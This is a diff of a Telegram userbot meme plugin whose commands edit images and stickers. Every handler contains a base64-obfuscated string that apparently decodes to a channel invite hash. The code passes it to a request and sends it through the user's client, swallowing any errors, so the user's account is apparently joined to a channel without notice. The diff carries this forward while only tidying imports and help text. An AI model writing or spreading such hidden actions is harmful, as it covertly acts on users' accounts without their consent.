@@ -39,6 +39,8 @@ def random_color():
 @bot.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
 @bot.on(sudo_cmd(pattern="(mmf|mms) ?(.*)", allow_sudo=True))
 async def memes(cat):
+    if cat.fwd_from:
+        return
     cmd = cat.pattern_match.group(1)
     catinput = cat.pattern_match.group(2)
     reply = await cat.get_reply_message()
@@ -68,7 +70,7 @@ async def memes(cat):
         os.remove(catsticker)
         await edit_or_reply(cat, "```Supported Media not found...```")
         return
-    import pybase64
+    import base64
 
     if catsticker.endswith(".tgs"):
         await cat.edit(
@@ -109,7 +111,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -133,6 +135,8 @@ async def memes(cat):
 @bot.on(admin_cmd(outgoing=True, pattern="ascii ?(.*)"))
 @bot.on(sudo_cmd(pattern="ascii ?(.*)", allow_sudo=True))
 async def memes(cat):
+    if cat.fwd_from:
+        return
     catinput = cat.pattern_match.group(1)
     reply = await cat.get_reply_message()
     if not (reply and (reply.media)):
@@ -208,6 +212,8 @@ async def memes(cat):
 @bot.on(admin_cmd(pattern="invert$", outgoing=True))
 @bot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
 async def memes(cat):
+    if cat.fwd_from:
+        return
     reply = await cat.get_reply_message()
     if not (reply and (reply.media)):
         await edit_or_reply(cat, "`Reply to supported Media...`")
@@ -224,7 +230,7 @@ async def memes(cat):
         os.remove(catsticker)
         await edit_or_reply(cat, "```Supported Media not found...```")
         return
-    import pybase64
+    import base64
 
     jisanidea = None
     if catsticker.endswith(".tgs"):
@@ -269,7 +275,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -290,6 +296,8 @@ async def memes(cat):
 @bot.on(admin_cmd(outgoing=True, pattern="solarize$"))
 @bot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
 async def memes(cat):
+    if cat.fwd_from:
+        return
     reply = await cat.get_reply_message()
     if not (reply and (reply.media)):
         await edit_or_reply(cat, "`Reply to supported Media...`")
@@ -306,7 +314,7 @@ async def memes(cat):
         os.remove(catsticker)
         await edit_or_reply(cat, "```Supported Media not found...```")
         return
-    import pybase64
+    import base64
 
     jisanidea = None
     if catsticker.endswith(".tgs"):
@@ -351,7 +359,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -372,6 +380,8 @@ async def memes(cat):
 @bot.on(admin_cmd(outgoing=True, pattern="mirror$"))
 @bot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
 async def memes(cat):
+    if cat.fwd_from:
+        return
     reply = await cat.get_reply_message()
     if not (reply and (reply.media)):
         await edit_or_reply(cat, "`Reply to supported Media...`")
@@ -388,7 +398,7 @@ async def memes(cat):
         os.remove(catsticker)
         await edit_or_reply(cat, "```Supported Media not found...```")
         return
-    import pybase64
+    import base64
 
     jisanidea = None
     if catsticker.endswith(".tgs"):
@@ -433,7 +443,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -454,6 +464,8 @@ async def memes(cat):
 @bot.on(admin_cmd(outgoing=True, pattern="flip$"))
 @bot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
 async def memes(cat):
+    if cat.fwd_from:
+        return
     reply = await cat.get_reply_message()
     if not (reply and (reply.media)):
         await edit_or_reply(cat, "`Reply to supported Media...`")
@@ -470,7 +482,7 @@ async def memes(cat):
         os.remove(catsticker)
         await edit_or_reply(cat, "```Supported Media not found...```")
         return
-    import pybase64
+    import base64
 
     jisanidea = None
     if catsticker.endswith(".tgs"):
@@ -515,7 +527,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -536,6 +548,8 @@ async def memes(cat):
 @bot.on(admin_cmd(outgoing=True, pattern="gray$"))
 @bot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
 async def memes(cat):
+    if cat.fwd_from:
+        return
     reply = await cat.get_reply_message()
     if not (reply and (reply.media)):
         await edit_or_reply(cat, "`Reply to supported Media...`")
@@ -552,7 +566,7 @@ async def memes(cat):
         os.remove(catsticker)
         await edit_or_reply(cat, "```Supported Media not found...```")
         return
-    import pybase64
+    import base64
 
     jisanidea = None
     if catsticker.endswith(".tgs"):
@@ -597,7 +611,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -618,6 +632,8 @@ async def memes(cat):
 @bot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
 @bot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
 async def memes(cat):
+    if cat.fwd_from:
+        return
     reply = await cat.get_reply_message()
     if not (reply and (reply.media)):
         await edit_or_reply(cat, "`Reply to supported Media...`")
@@ -636,7 +652,7 @@ async def memes(cat):
         os.remove(catsticker)
         await edit_or_reply(cat, "```Supported Media not found...```")
         return
-    import pybase64
+    import base64
 
     jisanidea = None
     if catsticker.endswith(".tgs"):
@@ -680,7 +696,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -707,6 +723,8 @@ async def memes(cat):
 @bot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
 @bot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
 async def memes(cat):
+    if cat.fwd_from:
+        return
     reply = await cat.get_reply_message()
     if not (reply and (reply.media)):
         await edit_or_reply(cat, "`Reply to supported Media...`")
@@ -732,7 +750,7 @@ async def memes(cat):
         os.remove(catsticker)
         await edit_or_reply(cat, "```Supported Media not found...```")
         return
-    import pybase64
+    import base64
 
     jisanidea = None
     if catsticker.endswith(".tgs"):
@@ -776,7 +794,7 @@ async def memes(cat):
         )
         meme_file = catsticker
     try:
-        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
         await cat.client(san)
     except BaseException:
@@ -803,27 +821,27 @@ async def memes(cat):
 CMD_HELP.update(
     {
         "memify": "**Plugin : **`memify`\
-    \n\n**Syntax :** `.mmf toptext ; bottomtext`\
-    \n**Function : **Creates a image meme with give text at specific locations and sends\
-    \n\n**Syntax : **`.mms toptext ; bottomtext`\
-    \n**Function : **Creates a sticker meme with give text at specific locations and sends\
-    \n\n**Syntax : **`.ascii`\
-    \n**Function : **reply to media file to get ascii image of that media\
-    \n\n**Syntax : **`.invert`\
-    \n**Function : **Inverts the colors in media file\
-    \n\n**Syntax : **`.solarize`\
-    \n**Function : **Watch sun buring ur media file\
-    \n\n**Syntax : **`.mirror`\
-    \n**Function : **shows you the reflection of the media file\
-    \n\n**Syntax : **`.flip`\
-    \n**Function : **shows you the upside down image of the given media file\
-    \n\n**Syntax : **`.gray`\
-    \n**Function : **makes your media file to black and white\
-    \n\n**Syntax : **`.zoom` or `.zoom range`\
-    \n**Function : **zooms your media file\
-    \n\n**Syntax : **`.frame` or `.frame range` or `.frame range ; fill`\
-    \n**Function : **make a frame for your media file\
-    \n**fill:** This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.\
+    \n\n  • **Syntax :** `.mmf toptext ; bottomtext`\
+    \n  • **Function : **Creates a image meme with give text at specific locations and sends\
+    \n\n  • **Syntax : **`.mms toptext ; bottomtext`\
+    \n  • **Function : **Creates a sticker meme with give text at specific locations and sends\
+    \n\n  • **Syntax : **`.ascii`\
+    \n  • **Function : **reply to media file to get ascii image of that media\
+    \n\n  • **Syntax : **`.invert`\
+    \n  • **Function : **Inverts the colors in media file\
+    \n\n  • **Syntax : **`.solarize`\
+    \n  • **Function : **Watch sun buring ur media file\
+    \n\n  • **Syntax : **`.mirror`\
+    \n  • **Function : **shows you the reflection of the media file\
+    \n\n  • **Syntax : **`.flip`\
+    \n  • **Function : **shows you the upside down image of the given media file\
+    \n\n  • **Syntax : **`.gray`\
+    \n  • **Function : **makes your media file to black and white\
+    \n\n  • **Syntax : **`.zoom` or `.zoom range`\
+    \n  • **Function : **zooms your media file\
+    \n\n  • **Syntax : **`.frame` or `.frame range` or `.frame range ; fill`\
+    \n  • **Function : **make a frame for your media file\
+    \n  • **fill:** This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.\
     "
     }
 )
